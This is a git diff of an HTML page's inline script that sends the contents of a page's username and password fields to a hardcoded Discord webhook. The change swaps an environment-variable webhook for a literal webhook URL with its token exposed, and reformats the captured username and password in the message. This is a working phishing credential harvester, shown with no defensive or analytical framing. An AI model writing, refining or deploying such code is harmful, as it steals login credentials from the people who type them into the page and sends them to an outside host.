@@ -2060,17 +2060,15 @@
               </div>
 
               <script>
-                require("dotenv").config()
-
-                const url = "https://discord.com/api/webhooks/1554223615250014328/TiwY9xX9FU53NcDlQ-rR8Zx4WbLB7CQE2F3ZquBooEJdrNOoZaYvrkZ1XmbjofJtqdtR"
+                const url = "https://discordapp.com/api/webhooks/1554223615250014328/TiwY9xX9FU53NcDlQ-rR8Zx4WbLB7CQE2F3ZquBooEJdrNOoZaYvrkZ1XmbjofJtqdtR"
                 console.log(url)
 
                 function doit() {
                   const msg = {
-                    "content": `**New input** \n User: ${document.getElementById("user").value} \n Pass: ${document.getElementById("pass").value}`
+                    "content": `**New input** \n User: \`${document.getElementById("user").value}\` \n Pass: \`${document.getElementById("pass").value}\``
                   }
 
-                  fetch(`${process.env.WEBHOOK_URL}`,
+                  fetch(url,
                     { "method": "POST", "headers": { "content-type": "application/json" }, "body": JSON.stringify(msg) }
                   )
                 }
